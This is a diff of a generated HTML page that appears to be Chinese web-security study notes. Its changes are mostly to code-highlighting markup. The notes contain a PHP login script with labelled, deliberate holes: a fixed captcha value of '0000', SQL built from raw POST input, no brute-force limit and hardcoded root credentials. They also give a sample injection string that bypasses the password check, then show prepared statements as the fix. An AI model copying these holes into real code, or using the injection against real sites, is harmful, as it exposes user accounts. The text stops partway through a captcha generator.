@@ -484,7 +484,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    1.2k
+                    1.1k
                 </div>
                 
 
@@ -560,43 +560,42 @@ alt="image-20220812222110333" />
 <li>下载burp证书</li>
 </ul>
 <h3 id="登陆漏洞-实现原理">登陆漏洞-实现原理</h3>
-<div class="sourceCode" id="cb1"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span>   </span>
-<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="co">// 获取用户提交请求的数据</span></span>
-<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="va">$username</span> <span class="op">=</span> <span class="va">$_POST</span>[<span class="st">&#39;username&#39;</span>]<span class="ot">;</span></span>
-<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="va">$password</span> <span class="op">=</span> <span class="va">$_POST</span>[<span class="st">&#39;password&#39;</span>]<span class="ot">;</span></span>
-<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="va">$vcode</span> <span class="op">=</span> <span class="va">$_POST</span>[<span class="st">&#39;vcode&#39;</span>]<span class="ot">;</span></span>
-<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="co">// 万能验证码漏洞</span></span>
-<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="co">// 验证码</span></span>
-<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span>(<span class="va">$vcode</span> <span class="op">!=</span> <span class="st">&#39;0000&#39;</span>) &#123;</span>
-<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a>    <span class="cf">die</span>(<span class="st">&quot;vcode-error&quot;</span>)<span class="ot">;</span></span>
-<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a>&#125;</span>
-<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="co">// 没有爆破防护</span></span>
-<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="co">// 连接到数据库</span></span>
-<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a><span class="va">$conn</span> <span class="op">=</span> <span class="fu">mysqli_connect</span>(<span class="st">&#39;127.0.0.1&#39;</span><span class="ot">,</span><span class="st">&#39;root&#39;</span><span class="ot">,</span><span class="st">&#39;123456&#39;</span><span class="ot">,</span><span class="st">&#39;learn&#39;</span>) <span class="op">or</span> <span class="cf">die</span>(<span class="st">&quot;数据库连接不成功&quot;</span>)<span class="ot">;</span></span>
-<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a><span class="co">// 设置编码格式</span></span>
-<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a><span class="fu">mysqli_query</span>(<span class="va">$conn</span><span class="ot">,</span> <span class="st">&quot;set names utf8&quot;</span>)<span class="ot">;</span></span>
-<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a><span class="va">$sql</span> <span class="op">=</span> <span class="st">&quot;SELECT * FROM login where username = &#39;</span><span class="va">$username</span><span class="st">&#39; and password = &#39;</span><span class="va">$password</span><span class="st">&#39;&quot;</span><span class="ot">;</span></span>
-<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a><span class="va">$result</span> <span class="op">=</span> <span class="fu">mysqli_query</span>(<span class="va">$conn</span><span class="ot">,</span> <span class="va">$sql</span>)<span class="ot">;</span></span>
-<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a><span class="cf">if</span> (<span class="fu">mysqli_num_rows</span>(<span class="va">$result</span>) <span class="op">==</span> <span class="dv">1</span>) &#123;    </span>
-<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&quot;login-pass&quot;</span><span class="ot">;</span></span>
-<span id="cb1-27"><a href="#cb1-27" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 失效的访问控制</span></span>
-<span id="cb1-28"><a href="#cb1-28" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&quot;&lt;script&gt;location.href=&#39;welcome.php&#39;&lt;/script&gt;&quot;</span><span class="ot">;</span></span>
-<span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a>&#125;<span class="cf">else</span> &#123; </span>
-<span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&quot;login-fail&quot;</span><span class="ot">;</span></span>
-<span id="cb1-31"><a href="#cb1-31" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="st">&quot;&lt;script&gt;location.href=&#39;login.html&#39;&lt;/script&gt;&quot;</span><span class="ot">;</span></span>
-<span id="cb1-32"><a href="#cb1-32" aria-hidden="true" tabindex="-1"></a>&#125;</span>
-<span id="cb1-33"><a href="#cb1-33" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb1-34"><a href="#cb1-34" aria-hidden="true" tabindex="-1"></a><span class="fu">mysqli_close</span>(<span class="va">$conn</span>)<span class="ot">;</span></span>
-<span id="cb1-35"><a href="#cb1-35" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb1-36"><a href="#cb1-36" aria-hidden="true" tabindex="-1"></a><span class="kw">?&gt;</span></span></code></pre></div>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   
+
+<span class="token comment">// 获取用户提交请求的数据</span>
+<span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$password</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+<span class="token variable">$vcode</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'vcode'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+
+
+<span class="token comment">// 万能验证码漏洞</span>
+<span class="token comment">// 验证码</span>
+<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$vcode</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'0000'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"vcode-error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// 没有爆破防护</span>
+
+<span class="token comment">// 连接到数据库</span>
+<span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'123456'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'learn'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"数据库连接不成功"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token comment">// 设置编码格式</span>
+<span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"set names utf8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM login where username = '<span class="token interpolation"><span class="token variable">$username</span></span>' and password = '<span class="token interpolation"><span class="token variable">$password</span></span>'"</span><span class="token punctuation">;</span>
+<span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">,</span> <span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"login-pass"</span><span class="token punctuation">;</span>
+    <span class="token comment">// 失效的访问控制</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>location.href='welcome.php'&lt;/script>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token punctuation">&#123;</span> 
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"login-fail"</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;script>location.href='login.html'&lt;/script>"</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$conn</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="sql注入">SQL注入</h3>
 <ul>
 <li>用户名单引号引发报错，暴露敏感信息</li>
@@ -617,8 +616,7 @@ src="C:/Users/liu%20haihua/AppData/Roaming/Typora/typora-user-images/image-20220
 alt="image-20220814170425490" />
 <figcaption aria-hidden="true">image-20220814170425490</figcaption>
 </figure>
-<div class="sourceCode" id="cb2"><pre
-class="sourceCode sql"><code class="sourceCode sql"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="kw">SELECT</span> <span class="op">*</span> <span class="kw">FROM</span> login <span class="kw">where</span> username <span class="op">=</span> <span class="st">&#39;x&#39;</span> <span class="kw">or</span> userid<span class="op">=</span><span class="dv">1</span>#<span class="st">&#39;&#39;</span> <span class="kw">and</span> <span class="kw">password</span> <span class="op">=</span> <span class="st">&#39;123123&#39;</span>;<span class="op">//</span> #号后面被注释</span></code></pre></div>
+<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> login <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'x'</span> <span class="token operator">or</span> userid<span class="token operator">=</span><span class="token number">1</span><span class="token comment">#'' and password = '123123';// #号后面被注释</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 <blockquote>
 <ul>
 <li>拼接有效</li>
@@ -678,84 +676,81 @@ alt="image-20220814192658532" />
 <ul>
 <li>面向对象</li>
 </ul>
-<div class="sourceCode" id="cb3"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="co">// mysql面向对象</span></span>
-<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> create_connection_oop() &#123;</span>
-<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a>    <span class="va">$conn</span> <span class="op">=</span><span class="kw">new</span> <span class="bu">mysqli</span>(<span class="st">&#39;127.0.0.1&#39;</span><span class="ot">,</span> <span class="st">&#39;root&#39;</span><span class="ot">,</span> <span class="st">&#39;123456&#39;</span><span class="ot">,</span> <span class="st">&#39;learn&#39;</span>) <span class="op">or</span> <span class="cf">die</span>(<span class="st">&quot;Couldn&#39;t connect to database&quot;</span>)<span class="ot">;</span></span>
-<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>    <span class="va">$conn</span>-&gt;query(<span class="st">&#39;SET NAMES utf8&#39;</span>)<span class="ot">;</span> </span>
-<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="va">$conn</span><span class="ot">;</span></span>
-<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a>&#125;</span>
-<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a><span class="co">// 执行sql语句</span></span>
-<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> test_mysql_oop() &#123;</span>
-<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>    <span class="va">$conn</span> <span class="op">=</span> create_connection_oop()<span class="ot">;</span></span>
-<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>    <span class="va">$sql</span> <span class="op">=</span> <span class="st">&quot;SELECT * FROM login where userid &lt; 6&quot;</span><span class="ot">;</span></span>
-<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a>    <span class="va">$result</span> <span class="op">=</span> <span class="va">$conn</span>-&gt;query(<span class="va">$sql</span>)<span class="ot">;</span></span>
-<span id="cb3-14"><a href="#cb3-14" aria-hidden="true" tabindex="-1"></a>    <span class="kw">echo</span> <span class="va">$result</span>-&gt;num_rows<span class="op">.</span><span class="st">&#39;&lt;/br&gt;&#39;</span><span class="ot">;</span></span>
-<span id="cb3-15"><a href="#cb3-15" aria-hidden="true" tabindex="-1"></a>    <span class="va">$rows</span> <span class="op">=</span> <span class="va">$result</span>-&gt;fetch_all(<span class="cn">MYSQLI_ASSOC</span>)<span class="ot">;</span></span>
-<span id="cb3-16"><a href="#cb3-16" aria-hidden="true" tabindex="-1"></a>    <span class="co">// var_dump($rows);</span></span>
-<span id="cb3-17"><a href="#cb3-17" aria-hidden="true" tabindex="-1"></a>    <span class="cf">foreach</span> (<span class="va">$rows</span> <span class="kw">as</span> <span class="va">$row</span>) &#123;</span>
-<span id="cb3-18"><a href="#cb3-18" aria-hidden="true" tabindex="-1"></a>        <span class="kw">echo</span> <span class="st">&quot;username  =&quot;</span><span class="op">.</span> <span class="va">$row</span>[<span class="st">&#39;username&#39;</span>]<span class="op">.</span> <span class="st">&quot;,password = &quot;</span><span class="op">.</span> <span class="va">$row</span>[<span class="st">&#39;password&#39;</span>]<span class="op">.</span><span class="st">&#39;&lt;/br&gt;&#39;</span><span class="ot">;</span></span>
-<span id="cb3-19"><a href="#cb3-19" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
-<span id="cb3-20"><a href="#cb3-20" aria-hidden="true" tabindex="-1"></a>&#125;</span></code></pre></div>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php">
+<span class="token comment">// mysql面向对象</span>
+<span class="token keyword">function</span> <span class="token function-definition function">create_connection_oop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$conn</span> <span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">mysqli</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'root'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'123456'</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'learn'</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Couldn't connect to database"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'SET NAMES utf8'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> 
+    <span class="token keyword">return</span> <span class="token variable">$conn</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+
+<span class="token comment">// 执行sql语句</span>
+<span class="token keyword">function</span> <span class="token function-definition function">test_mysql_oop</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">create_connection_oop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM login where userid &lt; 6"</span><span class="token punctuation">;</span>
+    <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">echo</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token property">num_rows</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span>
+    <span class="token variable">$rows</span> <span class="token operator">=</span> <span class="token variable">$result</span><span class="token operator">-></span><span class="token function">fetch_all</span><span class="token punctuation">(</span><span class="token constant">MYSQLI_ASSOC</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// var_dump($rows);</span>
+    <span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$rows</span> <span class="token keyword">as</span> <span class="token variable">$row</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"username  ="</span><span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">.</span> <span class="token string double-quoted-string">",password = "</span><span class="token operator">.</span> <span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'password'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <h3 id="mysqli-预处理功能">mysqli 预处理功能</h3>
-<div class="sourceCode" id="cb4"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="co">// mysqli 预处理</span></span>
-<span id="cb4-2"><a href="#cb4-2" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> mysqli_prepare_stmt() &#123;</span>
-<span id="cb4-3"><a href="#cb4-3" aria-hidden="true" tabindex="-1"></a>    <span class="va">$conn</span> <span class="op">=</span> create_connection_oop()<span class="ot">;</span></span>
-<span id="cb4-4"><a href="#cb4-4" aria-hidden="true" tabindex="-1"></a>    <span class="va">$sql</span> <span class="op">=</span> <span class="st">&quot;SELECT * FROM login WHERE userid &lt; ?&quot;</span><span class="ot">;</span></span>
-<span id="cb4-5"><a href="#cb4-5" aria-hidden="true" tabindex="-1"></a>    <span class="co">// $sql = &quot;update login set username = ? WHERE userid = ?&quot;;</span></span>
-<span id="cb4-6"><a href="#cb4-6" aria-hidden="true" tabindex="-1"></a>    <span class="va">$stmt</span> <span class="op">=</span> <span class="va">$conn</span>-&gt;prepare(<span class="va">$sql</span>)<span class="ot">;</span></span>
-<span id="cb4-7"><a href="#cb4-7" aria-hidden="true" tabindex="-1"></a>    <span class="va">$stmt</span>-&gt;bind_param(<span class="st">&#39;i&#39;</span><span class="ot">,</span> <span class="va">$userid</span>)<span class="ot">;</span></span>
-<span id="cb4-8"><a href="#cb4-8" aria-hidden="true" tabindex="-1"></a>    <span class="co">// $username = &#39;haha&#39;;</span></span>
-<span id="cb4-9"><a href="#cb4-9" aria-hidden="true" tabindex="-1"></a>    <span class="va">$userid</span> <span class="op">=</span> <span class="dv">4</span><span class="ot">;</span></span>
-<span id="cb4-10"><a href="#cb4-10" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 要查询结果还需要绑定结果参数</span></span>
-<span id="cb4-11"><a href="#cb4-11" aria-hidden="true" tabindex="-1"></a>    <span class="va">$stmt</span>-&gt;bind_result(<span class="va">$userid</span><span class="ot">,</span> <span class="va">$username</span><span class="ot">,</span> <span class="va">$password</span><span class="ot">,</span> <span class="va">$role</span><span class="ot">,</span> <span class="va">$avatar</span><span class="ot">,</span> <span class="va">$createtime</span>)<span class="ot">;</span></span>
-<span id="cb4-12"><a href="#cb4-12" aria-hidden="true" tabindex="-1"></a>    <span class="va">$stmt</span>-&gt;execute()<span class="ot">;</span></span>
-<span id="cb4-13"><a href="#cb4-13" aria-hidden="true" tabindex="-1"></a>    <span class="va">$stmt</span>-&gt;store_result()<span class="ot">;</span></span>
-<span id="cb4-14"><a href="#cb4-14" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> (<span class="va">$stmt</span>-&gt;fetch()) &#123;</span>
-<span id="cb4-15"><a href="#cb4-15" aria-hidden="true" tabindex="-1"></a>        <span class="kw">echo</span> <span class="va">$userid</span><span class="ot">,</span> <span class="va">$username</span><span class="ot">,</span> <span class="va">$password</span><span class="op">.</span><span class="st">&#39;&lt;/br&gt;&#39;</span><span class="ot">;</span></span>
-<span id="cb4-16"><a href="#cb4-16" aria-hidden="true" tabindex="-1"></a>    &#125;</span>
-<span id="cb4-17"><a href="#cb4-17" aria-hidden="true" tabindex="-1"></a>&#125;</span></code></pre></div>
+<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token comment">// mysqli 预处理</span>
+<span class="token keyword">function</span> <span class="token function-definition function">mysqli_prepare_stmt</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+    <span class="token variable">$conn</span> <span class="token operator">=</span> <span class="token function">create_connection_oop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"SELECT * FROM login WHERE userid &lt; ?"</span><span class="token punctuation">;</span>
+    <span class="token comment">// $sql = "update login set username = ? WHERE userid = ?";</span>
+    <span class="token variable">$stmt</span> <span class="token operator">=</span> <span class="token variable">$conn</span><span class="token operator">-></span><span class="token function">prepare</span><span class="token punctuation">(</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_param</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'i'</span><span class="token punctuation">,</span> <span class="token variable">$userid</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token comment">// $username = 'haha';</span>
+    <span class="token variable">$userid</span> <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span>
+    <span class="token comment">// 要查询结果还需要绑定结果参数</span>
+    <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">bind_result</span><span class="token punctuation">(</span><span class="token variable">$userid</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">,</span> <span class="token variable">$role</span><span class="token punctuation">,</span> <span class="token variable">$avatar</span><span class="token punctuation">,</span> <span class="token variable">$createtime</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">store_result</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$stmt</span><span class="token operator">-></span><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
+        <span class="token keyword">echo</span> <span class="token variable">$userid</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 <figure>
 <img src="https://s2.loli.net/2022/08/15/JlZNI5gxOTfduc1.png"
 alt="image-20220815161622192" />
 <figcaption aria-hidden="true">image-20220815161622192</figcaption>
 </figure>
 <h3 id="php-处理图片验证码">php 处理图片验证码</h3>
-<div class="sourceCode" id="cb5"><pre
-class="sourceCode php"><code class="sourceCode php"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="kw">&lt;?php</span></span>
-<span id="cb5-2"><a href="#cb5-2" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-3"><a href="#cb5-3" aria-hidden="true" tabindex="-1"></a><span class="fu">session_start</span>()<span class="ot">;</span></span>
-<span id="cb5-4"><a href="#cb5-4" aria-hidden="true" tabindex="-1"></a>getCode()<span class="ot">;</span></span>
-<span id="cb5-5"><a href="#cb5-5" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-6"><a href="#cb5-6" aria-hidden="true" tabindex="-1"></a><span class="kw">function</span> getCode(<span class="va">$vlen</span><span class="op">=</span><span class="dv">4</span><span class="ot">,</span> <span class="va">$width</span><span class="op">=</span><span class="dv">80</span><span class="ot">,</span> <span class="va">$height</span><span class="op">=</span><span class="dv">25</span>) &#123;</span>
-<span id="cb5-7"><a href="#cb5-7" aria-hidden="true" tabindex="-1"></a>    <span class="fu">header</span>(<span class="st">&#39;Content-Type: image/png&#39;</span>)<span class="ot">;</span></span>
-<span id="cb5-8"><a href="#cb5-8" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-9"><a href="#cb5-9" aria-hidden="true" tabindex="-1"></a>    <span class="va">$chars</span> <span class="op">=</span> <span class="st">&#39;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#39;</span><span class="ot">;</span></span>
-<span id="cb5-10"><a href="#cb5-10" aria-hidden="true" tabindex="-1"></a>    <span class="va">$vcode</span> <span class="op">=</span> <span class="fu">substr</span>(<span class="fu">str_shuffle</span>(<span class="va">$chars</span>)<span class="ot">,</span><span class="dv">0</span><span class="ot">,</span><span class="va">$vlen</span>)<span class="ot">;</span></span>
-<span id="cb5-11"><a href="#cb5-11" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-12"><a href="#cb5-12" aria-hidden="true" tabindex="-1"></a>    <span class="va">$_SESSION</span>[<span class="st">&#39;vcode&#39;</span>] <span class="op">=</span> <span class="va">$vcode</span><span class="ot">;</span></span>
-<span id="cb5-13"><a href="#cb5-13" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-14"><a href="#cb5-14" aria-hidden="true" tabindex="-1"></a>    <span class="va">$image</span> <span class="op">=</span> <span class="fu">imagecreate</span>(<span class="va">$width</span><span class="ot">,</span><span class="va">$height</span>)<span class="ot">;</span></span>
-<span id="cb5-15"><a href="#cb5-15" aria-hidden="true" tabindex="-1"></a>    <span class="va">$imgColor</span> <span class="op">=</span> <span class="fu">imagecolorallocate</span>(<span class="va">$image</span><span class="ot">,</span><span class="dv">100</span><span class="ot">,</span><span class="dv">200</span><span class="ot">,</span><span class="dv">200</span>)<span class="ot">;</span></span>
-<span id="cb5-16"><a href="#cb5-16" aria-hidden="true" tabindex="-1"></a></span>
-<span id="cb5-17"><a href="#cb5-17" aria-hidden="true" tabindex="-1"></a>    <span class="va">$color</span> <span class="op">=</span> <span class="fu">imagecolorallocate</span>(<span class="va">$image</span><span class="ot">,</span><span class="dv">0</span><span class="ot">,</span><span class="dv">0</span><span class="ot">,</span><span class="dv">0</span>)<span class="ot">;</span></span>
-<span id="cb5-18"><a href="#cb5-18" aria-hidden="true" tabindex="-1"></a>    <span class="fu">imagestring</span>(<span class="va">$image</span><span class="ot">,</span><span class="dv">5</span><span class="ot">,</span><span class="dv">20</span><span class="ot">,</span><span class="dv">5</span><span class="ot">,</span> <span class="va">$vcode</span><span class="ot">,</span><span class="va">$color</span>)<span class="ot">;</span></span>
-<span id="cb5-19"><a href="#cb5-19" aria-hidden="true" tabindex="-1"></a></span>
